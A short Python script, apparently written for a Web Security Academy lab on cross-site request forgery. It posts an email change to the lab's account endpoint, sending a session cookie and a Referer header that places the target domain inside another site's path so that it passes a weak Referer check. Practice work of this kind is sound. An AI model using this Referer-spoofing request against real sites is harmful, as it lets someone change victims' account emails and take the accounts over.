import requests

url = "https://0a6a00bd032dcb78c0d63cda00e000d0.web-security-academy.net/my-account/change-email"

cookies = {
	"session": "nmlM2FQrsm5D9xZW9cPgk2COR6DKBF9D"
}

headers = {
	"Referer": "https://my-website.com/0a6a00bd032dcb78c0d63cda00e000d0.web-security-academy.net"
}

data = {
	"email": "test@test2.com"
}

r = requests.post(url, data=data, cookies=cookies, headers=headers)

print(r.text)